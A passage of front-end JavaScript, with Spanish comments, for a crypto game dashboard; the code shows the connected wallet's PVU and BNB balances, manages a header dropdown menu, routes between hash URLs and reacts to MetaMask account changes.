    // Balance PVU
    getPVUBalance().then(function (result) {
        let cantPVU = (result / 1000000000000000000).toFixed(2),
            pvuInput = document.getElementById('pvu__value');
        pvuInput.innerText = cantPVU;
    });

    // Balance BNB
    web3.eth.getBalance(myAccount)
      .then(function (result) {
          let cantBNB = (result / 1000000000000000000),
              bnbInput = document.getElementById('bnb__value');
          bnbInput.innerText = cantBNB.toFixed(9);
      });
    
    setUserAddress();
}

function displayMenu() {
  let menuEnabled = divDesplegado.classList.contains('active');

    if (!menuEnabled) {
      dropdownMenu.classList.add('active');
      dropdownImg.classList.add('rotate');
    } else {
      dropdownMenu.classList.remove('active');
      dropdownImg.classList.remove('rotate')
    }
}

function showHeaderInfo() {

  // Elementos del header
  divLogin = document.getElementById('divLogin');
  divAccount = document.getElementById('divAccount');
  logoHead = document.getElementById('logoHead');

  // Si no está conectado le mostramos el botón login.
  if (isConnected) {
    divAccount.style.display = 'block';
    divLogin.style.display = 'none';
    setUserAddress();

    // Elementos y eventos de la barra desplegable
    dropdownButton = document.getElementById('divDesplegable');
    dropdownMenu = document.getElementById('divDesplegado');
    dropdownImg = document.getElementById('imgRotation');
    dropdownButton.onclick = displayMenu;

  } else {
    divAccount.style.display = 'none';
    divLogin.style.display = 'block';

    // Botón login
    divLogin.onclick = function () {
      history.pushState('', '', '/#/login');
    }
  }

  // Damos funcionamiento al click del logo
  logoHead.onclick = view_dashboard;
}


window.onload = () => {

    function redirectPage(url) {

      let urlShort = url.substring(0, 16);
      if (urlShort == '#/offering/seeds') url = '#/offering/seeds';

      switch (url) {
          case '#/login':
          isConnected ? view_dashboard() : view_login();
          break;

         case '#/profile/inventory':
          isConnected ? view_inventory() : view_login();
           break;

         case '#/':
            view_dashboard();
            break;
            
         case '#/offering/seeds':
            view_offering();
            break;

         case '#/marketplace/plant':
            view_marketplace('plant');
            break;

         case '#/marketplace/mother-tree':
            view_marketplace('mother-tree');
            break;

         case '#/marketplace/puzzle':
            view_marketplace('puzzle');
            break;
            
         default:
            view_dashboard();
            break;
       };

       showHeaderInfo();
    }
    
    function checkURL() {
        actURL = document.location.hash;
        if (actURL != lastURL) {
          redirectPage(actURL);
          lastURL = document.location.hash;
        }
    }

    function checkPathname(url) {
      switch (url) {
        case '/':
          if (!document.location.hash) { history.pushState('', '', '/#/') };
          break;

        case '/login':
          history.pushState('', '', '/#/login');
          break;
      }
    }

    // Listeners
    navText = [document.getElementById('navDashboard'),
            document.getElementById('navMarket'),
            document.getElementById('navOffering'),
            document.getElementById('navAccount'),
          ];

    navImg = [document.getElementById('imgDashboard'),
            document.getElementById('imgMarket'),
            document.getElementById('imgOffering'),
            document.getElementById('imgAccount'),
          ];

    checkConnection().then(function(result) {
      isConnected = result;
    });

    // Chequeos de URL
    setInterval(checkURL, 50);
    checkPathname(document.location.pathname);

    let buttonDisconnect = document.getElementById('buttonDisconnect');
    buttonDisconnect.addEventListener("click", function() {
      myAccount = '';
      isConnected = false;
      view_login();
    });

    // Seteamos un evento para corroborar si el menu dropdown está activo
    document.addEventListener("click", function(e){
      var clic = e.target;
      let menuEnabled = divDesplegado.classList.contains('active');
      if (menuEnabled && (clic != dropdownButton) && (clic != document.getElementById('MyAddressMain')) && (clic != dropdownImg)) {
        dropdownMenu.classList.remove('active');
        dropdownImg.classList.remove('rotate')
      }
    }, false);

    // Seteamos un evento para corroborar que no se desconecte o cambie de cuenta dentro de la web
    window.ethereum.on('accountsChanged', function (accounts) {
      if (accounts.length == 0) {
        isConnected = false;
        view_login();
      } else {
        myAccount = accounts[0];
        lastURL = '/';
      }
    })
};